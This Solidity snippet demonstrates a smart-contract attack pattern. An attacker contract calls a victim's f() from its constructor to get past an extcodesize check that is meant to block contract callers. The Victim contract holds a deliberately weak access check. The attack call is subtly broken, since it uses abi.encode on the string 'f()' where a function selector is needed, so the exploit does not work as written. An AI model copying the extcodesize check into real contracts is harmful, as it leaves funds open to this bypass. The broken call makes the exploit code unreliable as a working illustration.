contract ConstructorAttackForExtCodeCheckAttack {

    constructor (address victimAddress) payable public {
        victimAddress.call(abi.encode("f()"));
    }

}

contract Victim {
    function isContract(address addr) public view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    function f() public {
        require(isContract(msg.sender) == false,"msg.sender should not be a contract");
        // logic omitted
    }
}
